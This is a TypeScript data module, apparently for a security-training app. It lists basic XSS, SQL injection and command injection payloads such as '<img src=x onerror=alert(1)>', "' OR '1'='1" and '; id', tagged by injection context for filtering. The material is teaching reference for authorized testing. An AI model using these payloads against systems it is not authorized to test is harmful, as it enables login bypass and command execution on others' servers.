/**
 * Payload reference data.
 *
 * These are the canonical, basic teaching examples used in security courses
 * (OWASP, PortSwigger Web Security Academy, and similar). They exist to help a
 * learner recognize a vulnerability class and test for it on systems they own
 * or are authorized to test. They are reference strings, not automation, and
 * the command injection samples use harmless demonstrator commands only
 * (id, whoami, sleep), never anything destructive.
 *
 * Each entry has a stable `id`. Localized teaching copy lives under
 * lib/i18n/content and joins to a payload by that id.
 *
 * To extend this module, just add entries to the array below. The component
 * and its filters read straight from here.
 */

export type PayloadCategory = "XSS" | "SQL Injection" | "Command Injection";

// Where the payload is typically injected. Shown as a badge and used as a
// filter. One context per payload keeps the data and the badge simple.
export type PayloadContext =
  | "URL parameter"
  | "Form field"
  | "HTTP header"
  | "Request body"
  | "Cookie";

export type Payload = {
  id: string; // stable key, used to join explanations
  category: PayloadCategory;
  context: PayloadContext; // the usual injection point for this example
  value: string; // the reference string itself
  tags: readonly string[]; // cross cutting labels for filtering
};

export const payloadCategories: PayloadCategory[] = [
  "XSS",
  "SQL Injection",
  "Command Injection",
];

// Fixed order for the context filter row.
export const payloadContexts: PayloadContext[] = [
  "URL parameter",
  "Form field",
  "HTTP header",
  "Request body",
  "Cookie",
];

export const payloads = [
  /* ----------------------------- XSS ----------------------------- */
  {
    id: "xss-script-basic",
    category: "XSS",
    context: "URL parameter",
    value: "<script>alert(1)</script>",
    tags: ["basic"],
  },
  {
    id: "xss-img-onerror",
    category: "XSS",
    context: "Form field",
    value: "<img src=x onerror=alert(1)>",
    tags: ["basic", "event-handler"],
  },
  {
    id: "xss-svg-onload",
    category: "XSS",
    context: "Cookie",
    value: "<svg onload=alert(1)>",
    tags: ["basic", "event-handler"],
  },
  {
    id: "xss-url-encoded",
    category: "XSS",
    context: "URL parameter",
    value: "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    tags: ["encoded", "url"],
  },
  {
    id: "xss-html-entity",
    category: "XSS",
    context: "Form field",
    value: "&#60;script&#62;alert(1)&#60;/script&#62;",
    tags: ["encoded", "html-entity"],
  },
  {
    id: "xss-unicode-escape",
    category: "XSS",
    context: "Request body",
    value: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    tags: ["encoded", "unicode"],
  },
  {
    id: "xss-mixed-case",
    category: "XSS",
    context: "URL parameter",
    value: "<sCrIpT>alert(1)</sCrIpT>",
    tags: ["obfuscated", "case"],
  },
  {
    id: "xss-fromcharcode",
    category: "XSS",
    context: "URL parameter",
    value: "<script>alert(String.fromCharCode(88,83,83))</script>",
    tags: ["obfuscated"],
  },
  {
    id: "xss-var-split",
    category: "XSS",
    context: "Form field",
    value: "<img src=x onerror=\"a=alert;a(1)\">",
    tags: ["obfuscated", "event-handler"],
  },

  /* ------------------------ SQL Injection ------------------------ */
  {
    id: "sqli-single-quote",
    category: "SQL Injection",
    context: "Form field",
    value: "'",
    tags: ["basic", "error-based"],
  },
  {
    id: "sqli-or-1-1",
    category: "SQL Injection",
    context: "Form field",
    value: "' OR '1'='1",
    tags: ["basic", "auth-bypass"],
  },
  {
    id: "sqli-or-comment",
    category: "SQL Injection",
    context: "URL parameter",
    value: "' OR 1=1 -- ",
    tags: ["basic", "auth-bypass", "comment"],
  },
  {
    id: "sqli-admin-comment",
    category: "SQL Injection",
    context: "Form field",
    value: "admin' -- ",
    tags: ["basic", "auth-bypass", "comment"],
  },
  {
    id: "sqli-double-quote",
    category: "SQL Injection",
    context: "Form field",
    value: "\" OR \"1\"=\"1",
    tags: ["basic", "auth-bypass"],
  },
  {
    id: "sqli-union-null",
    category: "SQL Injection",
    context: "URL parameter",
    value: "' UNION SELECT NULL-- ",
    tags: ["union"],
  },
  {
    id: "sqli-time-sleep",
    category: "SQL Injection",
    context: "HTTP header",
    value: "' OR SLEEP(5)-- ",
    tags: ["time-based", "blind", "mysql"],
  },

  /* ---------------------- Command Injection ---------------------- */
  {
    id: "cmd-semicolon-id",
    category: "Command Injection",
    context: "HTTP header",
    value: "; id",
    tags: ["basic", "unix", "chaining"],
  },
  {
    id: "cmd-and-whoami",
    category: "Command Injection",
    context: "Form field",
    value: "&& whoami",
    tags: ["basic", "unix", "chaining"],
  },
  {
    id: "cmd-pipe-whoami",
    category: "Command Injection",
    context: "URL parameter",
    value: "| whoami",
    tags: ["basic", "unix", "pipe"],
  },
  {
    id: "cmd-subshell",
    category: "Command Injection",
    context: "Request body",
    value: "$(id)",
    tags: ["substitution", "unix"],
  },
  {
    id: "cmd-backtick",
    category: "Command Injection",
    context: "Request body",
    value: "`id`",
    tags: ["substitution", "unix"],
  },
  {
    id: "cmd-sleep",
    category: "Command Injection",
    context: "URL parameter",
    value: "; sleep 5",
    tags: ["time-based", "blind", "unix"],
  },
  {
    id: "cmd-win-amp",
    category: "Command Injection",
    context: "URL parameter",
    value: "& whoami",
    tags: ["basic", "windows", "chaining"],
  },
] as const satisfies readonly Payload[];

export type PayloadId = (typeof payloads)[number]["id"];
export type PayloadRecord = (typeof payloads)[number];

/** Every distinct tag, sorted, for the filter bar. */
export function allTags(): string[] {
  return [...new Set(payloads.flatMap((p) => p.tags))].sort();
}
